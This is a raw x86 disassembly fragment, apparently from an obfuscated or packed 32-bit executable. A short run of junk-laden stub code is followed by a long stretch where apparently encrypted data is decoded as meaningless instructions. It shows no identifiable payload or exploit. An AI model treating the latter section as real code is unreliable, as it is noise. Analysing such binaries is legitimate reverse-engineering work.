  403853:	xor    DWORD PTR ds:0x42a29a,edx
  403859:	mov    DWORD PTR [ebp-0x8],eax
  40385c:	mov    eax,DWORD PTR [ebp-0x10]
  40385f:	neg    edx
  403861:	xor    eax,esi
  403863:	mov    edx,0xffcd8d8f
  403868:	sub    edx,eax
  40386a:	mov    eax,ds:0x42a2fe
  40386f:	mov    DWORD PTR [ebp-0xc],edx
  403872:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  403879:	mov    eax,DWORD PTR [ebp-0x8]
  40387c:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  403886:	mov    DWORD PTR [ebp-0x3c],ebx
  403889:	mov    DWORD PTR ds:0x42a286,0xb52
  403893:	cmp    eax,ecx
  403895:	mov    DWORD PTR ds:0x42a2d2,0x1900
  40389f:	je     0x40a6a8
  4038a5:	xor    DWORD PTR ds:0x42a2b6,edx
  4038ab:	mov    eax,DWORD PTR [ebp-0x10]
  4038ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4038b1:	sub    DWORD PTR ds:0x42a266,0x42a2e2
  4038bb:	xor    eax,esi
  4038bd:	add    DWORD PTR ds:0x42a2ea,0x138
  4038c7:	xor    ecx,esi
  4038c9:	lea    ecx,[eax+ecx*1+0x64e5e2]
  4038d0:	and    DWORD PTR ds:0x42a26a,0x0
  4038da:	xor    eax,eax
  4038dc:	or     eax,DWORD PTR ds:0x42a26a
  4038e2:	inc    eax
  4038e3:	mov    ds:0x42a26a,eax
  4038e8:	cmp    DWORD PTR ds:0x42a26a,0x7
  4038ef:	jge    0x403935
  4038f5:	jmp    0x403910
  4038fa:	push   DWORD PTR [ebp-0x10]
  4038fd:	push   DWORD PTR [ebp-0x28]
  403900:	push   0x5cc9
  403905:	push   0x429181
  40390a:	call   DWORD PTR ds:0x42a3ca
  403910:	cmp    DWORD PTR ds:0x42a26a,0x6
  403917:	jne    0x403928
  40391d:	mov    eax,ds:0x42a26a
  403922:	inc    eax
  403923:	mov    ds:0x42a26a,eax
  403928:	cmp    DWORD PTR ds:0x42a26a,0x11
  40392f:	jb     0x4038da
  403935:	mov    eax,DWORD PTR [ebp-0xc]
  403938:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  403942:	xor    edx,edx
  403944:	or     DWORD PTR ds:0x42a29e,0x16dc
  40394e:	div    ecx
  403950:	or     eax,ecx
  403952:	mov    eax,DWORD PTR [ebp-0x8]
  403955:	xor    ecx,ecx
  403957:	xor    ecx,DWORD PTR ds:0x42a292
  40395d:	sbb    DWORD PTR ds:0x42a2fa,ecx
  403963:	mov    ecx,DWORD PTR [ebp-0x10]
  403966:	xor    eax,esi
  403968:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  403972:	xor    ecx,esi
  403974:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  40397e:	sub    eax,ecx
  403980:	cmp    edx,eax
  403982:	jne    0x408281
  403988:	mov    eax,DWORD PTR [ebp-0xc]
  40398b:	neg    ecx
  40398d:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  403994:	adc    ecx,eax
  403996:	jmp    0x405d47
  40399b:	inc    ebx
  40399c:	nop
  40399d:	jl     0x403948
  40399f:	rol    BYTE PTR [ecx-0x52337d56],1
  4039a5:	mov    ch,0x5d
  4039a7:	and    esp,DWORD PTR [esi+eiz*4+0x3a]
  4039ab:	out    dx,eax
  4039ac:	pop    esi
  4039ad:	add    DWORD PTR [ebx-0x7c7ca111],0xffffffd0
  4039b4:	xor    dl,0xec
  4039b7:	jne    0x403a17
  4039b9:	in     eax,dx
  4039ba:	arpl   ax,si
  4039bc:	jno    0x4039d9
  4039be:	xor    al,0x51
  4039c0:	xchg   BYTE PTR [ebx-0x306eb4f],al
  4039c6:	or     eax,0x56e0587f
  4039cb:	arpl   WORD PTR [ebx+eax*1-0x67],dx
  4039cf:	dec    esi
  4039d0:	mov    eax,0x82cdc2bf
  4039d5:	ins    DWORD PTR es:[edi],dx
  4039d6:	dec    ecx
  4039d7:	sub    cl,BYTE PTR [ecx+0x39]
  4039da:	icebp  
  4039db:	jle    0x4039dd
  4039dd:	test   BYTE PTR ds:0x6bc66c93,0x4
  4039e4:	adc    cl,BYTE PTR gs:[edx]
  4039e7:	aas    
  4039e8:	daa    
  4039e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039ea:	ds jp  0x403981
  4039ed:	je     0x403a50
  4039ef:	sbb    ebp,edx
  4039f1:	push   ss
  4039f2:	xor    esp,0x9
  4039f5:	fldenv [ecx-0x31]
  4039f8:	inc    ebp
  4039f9:	adc    eax,0x83624537
  4039fe:	sub    al,0x5e
  403a00:	pop    ds
  403a01:	enter  0x90e5,0xd1
  403a05:	push   eax
  403a06:	mov    WORD PTR [edx-0x257a83a4],ds
  403a0c:	adc    al,BYTE PTR [edx+0x14]
  403a0f:	add    dl,BYTE PTR [ebx+0x4f855920]
  403a15:	mov    BYTE PTR [ebp+0x7256e0da],dh
  403a1b:	cmp    al,0xfc
  403a1d:	(bad)  
  403a1e:	or     al,0x49
  403a20:	xor    DWORD PTR [ecx+eiz*2-0x1d681231],ebp
  403a27:	sub    al,0x4f
  403a29:	jbe    0x403a6b
  403a2b:	adc    al,0xb
  403a2d:	sub    eax,0x65851fdc
  403a32:	mov    eax,DWORD PTR [ebx+edi*2+0x4a8ecfc8]
  403a39:	test   BYTE PTR [esi+eax*2+0x77397620],bl
  403a40:	outs   dx,BYTE PTR ds:[esi]
  403a41:	cmp    DWORD PTR [ecx+0x6dde9ba5],ebp
  403a47:	shr    cl,cl
  403a49:	in     eax,dx
  403a4a:	xlat   BYTE PTR ds:[ebx]
  403a4b:	pop    edi
  403a4c:	shl    BYTE PTR [edx+0x7f],cl
  403a4f:	mov    dh,0x48
  403a51:	sbb    al,0x7
  403a53:	pop    edx
  403a54:	or     bh,BYTE PTR [edx+0x41de6014]
  403a5a:	dec    di
  403a5c:	pop    eax
  403a5d:	ja     0x403abb
  403a5f:	dec    esi
  403a60:	mov    ebp,0xeab1f277
  403a66:	bnd jg 0x403a11
  403a69:	push   ebp
  403a6a:	mov    esi,0xe3472dbd
  403a6f:	dec    ebx
  403a70:	lea    edi,[ebp+0x56]
  403a73:	xor    DWORD PTR [edi-0x52],0xe97d0686
  403a7a:	ror    ecx,0xa2
  403a7d:	sub    bh,BYTE PTR ds:0xff975141
  403a83:	stos   BYTE PTR es:[edi],al
  403a84:	add    eax,0x75822a44
  403a89:	cmp    cl,BYTE PTR [eax+0x63]
  403a8c:	repnz enter 0xef27,0xba
  403a91:	dec    ebx
  403a92:	pop    ecx
  403a93:	and    DWORD PTR [esi-0x587ffe4b],ebx
  403a99:	sub    eax,0xde89b919
  403a9e:	adc    al,0xee
  403aa0:	sbb    edi,DWORD PTR [edi]
  403aa2:	scas   al,BYTE PTR es:[edi]
  403aa3:	cs xor al,0x5d
  403aa6:	mov    ebp,0x1bfdfee7
  403aab:	std    
  403aac:	in     al,0xbf
  403aae:	push   edx
  403aaf:	push   ebx
  403ab0:	push   esp
  403ab1:	(bad)  
  403ab2:	aaa    
  403ab3:	sbb    al,0xe6
  403ab5:	jne    0x403b04
  403ab7:	cmp    esp,esi
  403ab9:	xor    eax,ebx
  403abb:	xchg   ch,ch
  403abd:	sbb    eax,0x95e63575
  403ac2:	add    eax,0x94ae991c
  403ac7:	gs gs pop edx
  403aca:	iret   
  403acb:	mov    ebx,0x72d92d15
  403ad0:	push   ebx
  403ad1:	jmp    0x1d36:0xfb6b7d8b
  403ad8:	push   eax
  403ad9:	not    WORD PTR [esi]
  403adc:	jno    0x403ac7
  403ade:	xor    edx,DWORD PTR [ecx-0x38d48b9c]
  403ae4:	or     eax,0xd0a1cc5c
  403ae9:	push   ebx
  403aea:	rol    BYTE PTR [eax-0x78],1
  403aed:	sti    
  403aee:	dec    ebx
  403aef:	pusha  
  403af0:	fnstenv [edx+0x14f0e6a3]
  403af6:	mov    ebp,0x49b351bc
  403afb:	bound  ebx,QWORD PTR [edi]
  403afd:	sbb    DWORD PTR [esi-0x22cba41a],eax
  403b03:	or     eax,0xa8c1ced5
  403b08:	cld    
  403b09:	stc    
  403b0a:	inc    edx
  403b0b:	sub    ebx,ebp
  403b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b0e:	xchg   ecx,eax
  403b0f:	pop    esi
  403b10:	(bad)  
  403b11:	ins    DWORD PTR es:[edi],dx
  403b12:	ret    0x972f
  403b15:	aad    0xd7
  403b17:	adc    esi,0x6d9f039e
  403b1d:	jg     0x403b5c
  403b1f:	cmc    
  403b20:	shl    edi,1
  403b22:	cmp    bh,BYTE PTR [edi+0x6e]
  403b25:	cwde   
  403b26:	sbb    eax,DWORD PTR [esi-0x19fe5f01]
  403b2c:	aam    0xd1
  403b2e:	pusha  
  403b2f:	adc    cl,BYTE PTR [esi+0x56ded119]
  403b35:	mov    WORD PTR [esi+0x1d850a45],cs
  403b3b:	adc    eax,ebx
  403b3d:	or     dh,bh
  403b3f:	cdq    
  403b40:	jno    0x403af0
  403b42:	rcr    BYTE PTR [ebp+0x77],0xae
  403b46:	sub    ecx,0xffffff86
  403b49:	inc    ecx
  403b4a:	adc    BYTE PTR gs:[ebp+0x6e],dh
  403b4e:	xor    bh,BYTE PTR [ebp-0x20]
  403b51:	mov    ah,0x55
  403b53:	xor    al,0x4a
  403b55:	sub    dh,bh
  403b57:	adc    bh,BYTE PTR [esp+edx*1+0x656667fd]
  403b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b5f:	pop    esi
  403b60:	ins    DWORD PTR es:[edi],dx
  403b61:	fwait
  403b62:	iret   
  403b63:	iret   
  403b64:	(bad)  
  403b66:	rol    BYTE PTR [esi],cl
  403b68:	sbb    ebp,DWORD PTR [eax-0x4]
  403b6b:	js     0x403bba
  403b6d:	adc    bh,bl
  403b6f:	ja     0x403b72
  403b71:	push   ecx
  403b72:	xor    BYTE PTR [edx+0x3c19dcf2],0x59
  403b79:	pop    ebx
  403b7a:	arpl   WORD PTR [ebp+0x4c],sp
  403b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b7e:	sub    al,0xbb
  403b80:	test   eax,0x4c1d2a32
  403b85:	jae    0x403b07
  403b87:	dec    esi
  403b88:	in     eax,0xa6
  403b8a:	xor    DWORD PTR [edx+0x11e00291],ebx
  403b90:	jnp    0x403b46
  403b92:	addr16 pop esp
  403b94:	xadd   DWORD PTR [esi+0x7f84d52d],edx
  403b9b:	push   es
  403b9c:	in     eax,dx
  403b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b9e:	loop   0x403b64
  403ba0:	int    0x64
  403ba2:	cmp    BYTE PTR [edi],al
  403ba4:	or     DWORD PTR [edx+0x708404f8],0x1c5621d6
  403bae:	push   0xffffffb4
  403bb0:	add    eax,0xb3928077
  403bb5:	loope  0x403c12
  403bb7:	adc    eax,0x788e9340
  403bbc:	mov    ebp,0xd35b5e7c
  403bc1:	mov    ds:0xd8e77d68,eax
  403bc6:	mov    eax,ss:0xd7739039
  403bcc:	xchg   esi,eax
  403bcd:	jne    0x403b56
  403bcf:	xor    eax,0x1852dee
  403bd4:	ins    BYTE PTR es:[edi],dx
  403bd5:	cmp    eax,0x66e12e04
  403bda:	arpl   WORD PTR [ecx],si
  403bdc:	sti    
  403bdd:	push   ebx
  403bde:	ficom  WORD PTR [eax]
  403be0:	jo     0x403b67
  403be2:	popa   
  403be3:	in     eax,dx
  403be4:	mov    BYTE PTR [esi-0x1af9022c],dl
  403bea:	xor    edi,DWORD PTR [edi]
  403bec:	push   cs
  403bed:	psubd  mm3,QWORD PTR [edi+0xa25cb8a]
  403bf4:	dec    edi
  403bf5:	cld    
  403bf6:	and    eax,0x5f34e2ef
  403bfb:	retf   
  403bfc:	push   ebp
  403bfd:	dec    ecx
  403bfe:	nop
  403bff:	retw   
  403c01:	dec    esi
  403c02:	mov    bh,0x98
  403c04:	retf   
  403c05:	jb     0x403b90
  403c07:	mov    WORD PTR [ecx+eiz*1+0x27],ds
  403c0b:	movhps QWORD PTR [ebx],xmm4
  403c0e:	dec    esi
  403c0f:	sbb    ebx,ebx
  403c11:	mov    eax,0x3aefe43c
  403c16:	(bad)  
  403c17:	out    dx,al
  403c18:	retf   0xffc1
  403c1b:	pop    esi
  403c1c:	div    BYTE PTR [eax+0x5c]
  403c1f:	jl     0x403c4d
  403c21:	mov    BYTE PTR [ecx-0x47f36909],dl
  403c27:	and    BYTE PTR [esi],dh
  403c29:	data16 js 0x403bb5
  403c2c:	loop   0x403c8d
  403c2e:	mov    ?,WORD PTR [eax+0x7d]
  403c31:	adc    DWORD PTR [esp+ebx*4-0x4cc2da45],ebx
  403c38:	lock cmp dh,BYTE PTR [ecx-0x33]
  403c3c:	and    eax,0xd0351fd2
  403c41:	loope  0x403c86
  403c43:	cmp    dh,al
  403c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c46:	daa    
  403c47:	fist   DWORD PTR [ecx+0x75]
  403c4a:	mov    ecx,0x82ddf99f
  403c4f:	cmp    dh,dh
  403c51:	xor    eax,0x729a8b51
  403c56:	push   esp
  403c57:	sub    al,0x8d
  403c59:	rol    DWORD PTR [edx+0x53],0x88
  403c5d:	jp     0x403cdb
  403c5f:	into   
  403c60:	daa    
  403c61:	dec    eax
  403c62:	mov    ds:0xb8c38da3,eax
  403c67:	and    al,0x48
  403c69:	loop   0x403c7c
  403c6b:	jmp    0x403c01
  403c6d:	inc    edi
  403c6e:	xchg   ecx,eax
  403c6f:	(bad)  
  403c70:	fld    TBYTE PTR [edi+0x10]
  403c73:	mov    ah,0xf0
  403c75:	mov    ecx,0xa849e3ef
  403c7a:	data16 into 
  403c7c:	and    ah,ah
  403c7e:	or     al,0xce
  403c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c81:	mov    dh,0x78
  403c83:	inc    esi
  403c84:	in     al,dx
  403c85:	adc    BYTE PTR [edi+0x2c48c3f3],ah
  403c8b:	xor    al,0x5
  403c8d:	iret   
  403c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c8f:	inc    esi
  403c90:	sahf   
  403c91:	mul    esi
  403c93:	jmp    0x823f130d
  403c98:	pop    esi
  403c99:	inc    ecx
  403c9a:	sub    eax,0xf33983c1
  403c9f:	fneni(8087 only) 
  403ca1:	fwait
  403ca2:	cdq    
  403ca3:	add    al,0xe7
  403ca5:	xor    eax,0x58e28f27
  403caa:	or     DWORD PTR [ecx+0x5249f2da],eax
  403cb0:	fwait
  403cb1:	mov    dh,0xd8
  403cb3:	and    al,0x1f
  403cb5:	mov    ebp,0x88665a70
  403cba:	inc    eax
  403cbb:	pop    ss
  403cbc:	or     ebp,DWORD PTR [ebp+0x1b5ddd2f]
  403cc2:	jno    0x403cff
  403cc4:	fcomi  st,st(5)
  403cc6:	int3   
  403cc7:	inc    esi
  403cc8:	inc    esp
  403cc9:	out    0xa7,al
  403ccb:	clc    
  403ccc:	fistp  DWORD PTR [edi-0x6b7f1bbd]
  403cd2:	sub    ebp,0x1f
  403cd5:	ins    DWORD PTR es:[edi],dx
  403cd6:	pop    esp
  403cd7:	sub    eax,0x982dd4fa
  403cdc:	xor    eax,0xbf353a58
  403ce1:	cld    
  403ce2:	leave  
  403ce3:	and    BYTE PTR [eax-0x49],dl
  403ce6:	inc    esp
  403ce7:	or     eax,0x87367219
  403cec:	adc    al,0x2c
  403cee:	cld    
  403cef:	xor    ecx,esp
  403cf1:	fstp   QWORD PTR [eax+0x5dcd916f]
  403cf7:	and    dh,BYTE PTR [eax*8+0x32b91704]
  403cfe:	adc    edi,ebx
  403d00:	mov    DWORD PTR [esi],eax
  403d02:	jns    0x403d70
  403d04:	ins    BYTE PTR es:[edi],dx
  403d05:	and    DWORD PTR [ebx],eax
  403d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d08:	jmp    0x403cc4
  403d0a:	add    edi,ecx
  403d0c:	je     0x403cf3
  403d0e:	rcr    BYTE PTR [ebx-0x2b0be666],0xde
  403d15:	xor    bl,BYTE PTR [ebx]
  403d17:	push   ecx
  403d18:	cld    
  403d19:	push   0xffffffc7
  403d1b:	ds ins BYTE PTR es:[edi],dx
  403d1d:	dec    esi
  403d1e:	fs gs mov eax,0xd53f7b00
  403d25:	shr    DWORD PTR [ebp+eiz*1-0x9],cl
  403d29:	or     esi,esp
  403d2b:	mov    ebx,0xcc4eeac1
  403d30:	xchg   ebp,eax
  403d31:	into   
  403d32:	or     ch,BYTE PTR [ebx+esi*1]
  403d35:	jae    0x403d49
  403d37:	pop    ss
  403d38:	mov    ecx,0xe5ea72f1
  403d3d:	xor    BYTE PTR [eax+0x20d4ba2c],bh
  403d43:	cli    
  403d44:	mov    ch,0x6a
  403d46:	sbb    edx,ecx
  403d48:	add    dh,BYTE PTR [edx]
  403d4a:	dec    edx
  403d4b:	push   0xfffffff6
  403d4d:	das    
  403d4e:	inc    eax
  403d4f:	repz push ebp
  403d51:	or     eax,0x5c2f897b
  403d56:	mov    edx,0x624f185a
  403d5b:	pop    ebx
  403d5c:	test   BYTE PTR [edi+eiz*8-0x38348f08],0x16
  403d64:	pop    es
  403d65:	adc    BYTE PTR [esi],0xb6
  403d68:	fsubr  QWORD PTR [ecx-0x4d]
  403d6b:	ja     0x403cf7
  403d6d:	lock adc ah,dl
  403d70:	or     al,0xf4
  403d72:	ins    DWORD PTR es:[edi],dx
  403d73:	or     eax,0x9f689554
  403d78:	mov    ecx,0xdd4ac411
  403d7d:	scas   al,BYTE PTR es:[edi]
  403d7e:	mov    WORD PTR [ebx+0x22],ds
  403d81:	jge    0x403dbf
  403d83:	(bad)  
  403d84:	pushf  
  403d85:	add    eax,0x478f9277
  403d8a:	jl     0x403d66
  403d8c:	retf   
  403d8d:	add    al,BYTE PTR ds:0x8c93b7a4
  403d93:	cmp    dl,dh
  403d95:	cmp    ecx,ebx
  403d97:	push   edi
  403d98:	(bad)  
  403d99:	aad    0x43
  403d9b:	loop   0x403d26
  403d9d:	nop
  403d9e:	xchg   esp,eax
  403d9f:	xor    eax,DWORD PTR [ebx+0x48902b14]
  403da5:	mov    ah,dl
  403da7:	bound  ebx,QWORD PTR [esi+0x2b]
  403daa:	stos   DWORD PTR es:[edi],eax
  403dab:	in     eax,0xda
  403dad:	icebp  
  403dae:	cdq    
  403daf:	inc    esp
  403db1:	adc    ch,bh
  403db3:	fisub  WORD PTR [ebp+edi*1+0x531ade00]
  403dba:	popa   
  403dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dbc:	xlat   BYTE PTR ds:[ebx]
  403dbd:	add    eax,0x234a33d7
  403dc2:	sbb    eax,0x4e
  403dc5:	nop
  403dc6:	sub    DWORD PTR [ecx],esi
  403dc8:	xor    DWORD PTR [edi-0x39],edi
  403dcb:	or     eax,0xd7ee85e2
  403dd0:	cmp    DWORD PTR [edx+0x725bcd45],ebp
  403dd6:	retf   
  403dd7:	xor    eax,0xc75d7fcb
  403ddc:	jnp    0x403e54
  403dde:	cmp    ebp,DWORD PTR [eax]
  403de0:	jo     0x403dba
  403de2:	lea    edx,[ebx-0x1f]
  403de5:	xor    al,0x2b
  403de7:	pop    ss
  403de8:	fxch   st(2)
  403dea:	mov    es,WORD PTR [esi]
  403dec:	in     eax,0xec
  403dee:	(bad)  
  403def:	lock adc bh,BYTE PTR [eax+0x59]
  403df3:	sub    DWORD PTR [ecx+0x38f47ce8],edx
  403df9:	(bad)  
  403dfa:	sbb    BYTE PTR [edi+0x7a6501b0],dh
  403e00:	push   edi
  403e01:	add    esp,DWORD PTR [eax-0x37]
  403e04:	test   DWORD PTR [esi-0x42312104],edx
  403e0a:	repz popa 
  403e0c:	push   cs
  403e0d:	cmc    
  403e0e:	cmp    al,0x88
  403e10:	push   ecx
  403e11:	jp     0x403e77
  403e13:	push   ebp
  403e14:	dec    esi
  403e15:	pop    gs
  403e17:	add    DWORD PTR [eax+eiz*8],eax
  403e1a:	xor    ah,bl
  403e1c:	icebp  
  403e1d:	sub    ebp,ebp
  403e1f:	add    edi,ebx
  403e21:	(bad)  
  403e22:	mov    WORD PTR [ebp+0x199b602e],gs
  403e28:	xchg   ecx,eax
  403e29:	ror    DWORD PTR [eax+0x5d4255b],cl
  403e2f:	push   edx
  403e30:	cmp    DWORD PTR [ebx-0x15],ecx
  403e33:	cmp    edx,DWORD PTR [edx]
  403e35:	ins    DWORD PTR es:[edi],dx
  403e36:	mov    eax,ds:0x3dcfa06e
  403e3b:	jp     0x403e9f
  403e3d:	mov    eax,0x43077fb
  403e42:	out    dx,eax
  403e43:	push   eax
  403e44:	sbb    ch,ah
  403e46:	jg     0x403e41
  403e48:	jle    0x403e7e
  403e4a:	mov    dh,0xaf
  403e4c:	stc    
  403e4d:	jmp    0x836f09d2
  403e52:	mov    ah,0xa5
  403e54:	xchg   edx,eax
  403e55:	imul   esp,DWORD PTR [edi],0x55
  403e58:	mov    ah,0x69
  403e5a:	sub    al,0xf6
  403e5c:	fcom   DWORD PTR [ebx+0x7647f44d]
  403e62:	sti    
  403e63:	out    0x0,eax
  403e65:	aam    0x55
  403e67:	push   eax
  403e68:	adc    DWORD PTR [ebx],ebx
  403e6a:	sub    eax,0x2255847c
  403e6f:	(bad)  
  403e70:	fcom   st(3)
  403e72:	mov    edi,0x5cceb25
  403e77:	popa   
  403e78:	cdq    
  403e79:	fst    DWORD PTR [eax+0xb416bf4]
  403e7f:	gs push esp
  403e81:	sbb    DWORD PTR [ebx-0x4ecd1359],ecx
  403e87:	and    eax,0x87ad5f13
  403e8c:	and    DWORD PTR [esi],esp
  403e8e:	sahf   
  403e8f:	fisttp QWORD PTR [esi]
  403e91:	and    al,0x5d
  403e93:	inc    ecx
  403e94:	pop    esp
  403e95:	inc    esp
  403e96:	xor    dl,BYTE PTR [edx+0x38011bb3]
  403e9c:	fs mov bl,0xef
  403e9f:	es popf 
  403ea1:	(bad)  
  403ea2:	hlt    
  403ea3:	clc    
  403ea4:	inc    eax
  403ea5:	out    dx,al
  403ea6:	cmp    ecx,DWORD PTR [ebx+esi*4-0x558cde06]
  403ead:	dec    ebp
  403eae:	aam    0xdc
  403eb0:	lods   eax,DWORD PTR ds:[esi]
  403eb1:	fisub  WORD PTR [esi-0x549d8cd9]
  403eb7:	fucomp st(3)
  403eb9:	mov    dh,0xfa
  403ebb:	inc    ebp
  403ebc:	enter  0xc0f4,0x92
  403ec0:	mov    ebp,0x8eef6098
  403ec5:	(bad)  
  403ec6:	mov    esp,0x7e351bc3
  403ecb:	mov    esp,0xb5b29bad
  403ed0:	sbb    bl,BYTE PTR [eax-0x2d7529c6]
  403ed6:	cwde   
  403ed7:	dec    eax
  403ed8:	mov    al,ds:0x8aff882d
  403edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ede:	mov    ebx,0x6052e621
  403ee3:	retf   
  403ee4:	(bad)  
  403ee5:	jmp    DWORD PTR [eax+0x651ae9c7]
  403eeb:	xchg   cl,bl
  403eed:	aas    
  403eee:	fadd   QWORD PTR [esi-0x5c8a6cbd]
  403ef4:	out    dx,eax
  403ef5:	pop    edx
  403ef6:	dec    ebp
  403ef7:	loopne 0x403f47
  403ef9:	sbb    al,BYTE PTR [ecx]
  403efb:	dec    esi
  403efc:	push   0xffffffbe
  403efe:	popf   
  403eff:	inc    edi
  403f00:	sub    BYTE PTR [edi],cl
  403f02:	lods   eax,DWORD PTR ds:[esi]
  403f03:	and    DWORD PTR [edx-0x4a],ebx
  403f06:	or     eax,0x5155db5d
  403f0b:	push   eax
  403f0c:	and    BYTE PTR [edx],0x70
  403f0f:	test   DWORD PTR [ecx-0xf],edi
  403f12:	stc    
  403f13:	maskmovq mm6,(bad)
  403f14:	div    DWORD PTR [esi-0x78cdac77]
  403f1a:	fist   DWORD PTR [esi-0x53]
  403f1d:	mov    ?,edi
  403f1f:	add    al,0x21
  403f21:	xchg   ebp,eax
  403f22:	dec    ebp
  403f23:	xchg   DWORD PTR [ebx],ecx
  403f25:	cmp    DWORD PTR [edi+0x47],esp
  403f28:	inc    eax
  403f29:	int3   
  403f2a:	(bad)  
  403f2b:	aad    0x26
  403f2d:	in     eax,dx
  403f2e:	jmp    0x403f98
  403f30:	cmp    eax,0xd611c3a5
  403f35:	or     DWORD PTR [eax],esp
  403f37:	cmc    
  403f38:	lds    ecx,FWORD PTR [ebx+0x47f55caf]
  403f3e:	js     0x403f9e
  403f40:	xchg   DWORD PTR [ebx+ebx*1-0x44],edi
  403f44:	pop    edi
  403f45:	mov    eax,ds:0x95ebb26c
  403f4a:	mov    ds:0xed978c57,al
  403f4f:	aam    0x4c
  403f51:	push   ss
  403f52:	push   0x4a761b01
  403f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f58:	mov    cl,0x72
  403f5a:	cs adc al,0x1c
  403f5d:	cmp    edi,DWORD PTR [edx+0x30]
  403f60:	adc    al,0x33
  403f62:	bound  esp,QWORD PTR [esi+0x16]
  403f65:	inc    ebp
  403f66:	mov    dh,0x44
  403f68:	std    
  403f69:	sbb    DWORD PTR [esi-0x7],esi
  403f6c:	push   ss
  403f6d:	aam    0x4d
  403f6f:	mov    ah,0xa7
  403f71:	(bad)  
  403f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f73:	ins    BYTE PTR es:[edi],dx
  403f74:	lods   eax,DWORD PTR ds:[esi]
  403f75:	cwde   
  403f76:	loop   0x403f11
  403f78:	stc    
  403f79:	daa    
  403f7a:	pop    ebx
  403f7b:	loopne 0x403ff5
  403f7d:	jecxz  0x403ff0
  403f7f:	sar    DWORD PTR [edi+0x63e11d8f],cl
  403f85:	add    eax,0xfef3ad1
  403f8a:	xchg   ebp,eax
  403f8b:	mov    cl,dl
  403f8d:	push   ecx
  403f8e:	mov    ecx,0xf85bc4a8
  403f93:	mov    edx,0x5d4ac624
  403f98:	jbe    0x403f8d
  403f9a:	mov    dl,0xfa
  403f9c:	xchg   edi,eax
  403f9d:	call   0x1e588f40
  403fa2:	cmc    
  403fa3:	dec    esp
  403fa4:	jo     0x404000
  403fa6:	sub    al,0xdf
  403fa8:	test   eax,0x4ed885e
  403fad:	xchg   esp,eax
  403fae:	adc    ch,0x5d
  403fb1:	hlt    
  403fb2:	loop   0x40400e
  403fb4:	xor    ch,BYTE PTR [eax]
  403fb6:	mov    ds:0x14ecd683,eax
  403fbb:	stos   DWORD PTR es:[edi],eax
  403fbc:	add    BYTE PTR [ecx],ah
  403fbe:	inc    eax
  403fbf:	mov    esi,0x525af35a
  403fc4:	mov    ?,WORD PTR [ecx]
  403fc6:	and    eax,0x5c145c3c
  403fcb:	cld    
  403fcc:	call   0x75354047
  403fd1:	cmp    DWORD PTR ds:0xb71114b4,ebx
  403fd7:	cwde   
  403fd8:	rcl    BYTE PTR [edi-0x79871f3a],cl
  403fde:	pop    esi
  403fdf:	outs   dx,BYTE PTR ds:[esi]
  403fe0:	lock and bl,BYTE PTR [edi+eiz*2]
  403fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fe5:	and    esi,ebp
  403fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fe8:	retf   0xcb0f
  403feb:	int3   
  403fec:	lods   eax,DWORD PTR ds:[esi]
  403fed:	add    cl,BYTE PTR [edi]
  403fef:	inc    ebp
  403ff0:	or     DWORD PTR [edx+0x7c],edx
  403ff3:	lahf   
  403ff4:	fbld   TBYTE PTR [edx-0x62666c13]
  403ffa:	cmp    al,0x66
  403ffc:	mov    BYTE PTR [eax+ebx*1],al
  403fff:	and    ah,0xb6
  404002:	adc    ebx,ebx
  404004:	and    DWORD PTR [ecx],eax
  404006:	cmp    esi,ebx
  404008:	je     0x404084
  40400a:	adc    al,0x15
  40400c:	sub    BYTE PTR [ecx-0x64],bl
  40400f:	outs   dx,DWORD PTR ds:[esi]
  404010:	pop    eax
  404011:	sbb    DWORD PTR [eax+edx*8-0x25],0x1052d1c5
  404019:	(bad)  
  40401a:	or     cl,BYTE PTR [edi]
  40401c:	scas   eax,DWORD PTR es:[edi]
  40401d:	icebp  
  40401e:	repnz fdiv DWORD PTR [edx-0x33]
  404022:	xor    ah,BYTE PTR [ebp+0x13c3aef9]
  404028:	cmp    DWORD PTR [esi],ebx
  40402a:	dec    ebx
  40402b:	jg     0x403fd8
  40402d:	fnstsw WORD PTR ds:0x244a6732
  404033:	loop   0x4040a5
  404035:	jns    0x40402e
  404037:	stos   BYTE PTR es:[edi],al
  404038:	test   al,0xed
  40403a:	int    0x1e
  40403c:	jae    0x4040a1
  40403e:	inc    esp
  40403f:	inc    ebp
  404040:	inc    eax
  404041:	data16 mov bh,0xe7
  404044:	out    0x73,eax
  404046:	sub    BYTE PTR [edi+0xa],bh
  404049:	mov    DWORD PTR [edx-0xd955bdb],edi
  40404f:	int    0x94
  404051:	lea    edi,[esi+0x13]
  404054:	xchg   edi,eax
  404055:	lahf   
  404056:	xchg   DWORD PTR [ecx-0x79],esi
  404059:	scas   eax,DWORD PTR es:[edi]
  40405a:	lea    eax,[esi-0x6]
  40405d:	das    
  40405e:	adc    dl,BYTE PTR [ecx]
  404060:	jmp    0x7f85c399
  404065:	adc    DWORD PTR [edx+0x2d],0x0
  404069:	push   ds
  40406a:	sub    al,BYTE PTR [eax]
  40406c:	push   cs
  40406d:	ret    0xf121
  404070:	mov    ch,BYTE PTR [edx+ebp*8+0x1e480e0]
  404077:	sub    eax,0x33b33a59
  40407c:	pop    ss
  40407d:	jge    0x4040cc
  40407f:	dec    ebp
  404080:	jns    0x4040ed
  404082:	test   bh,dh
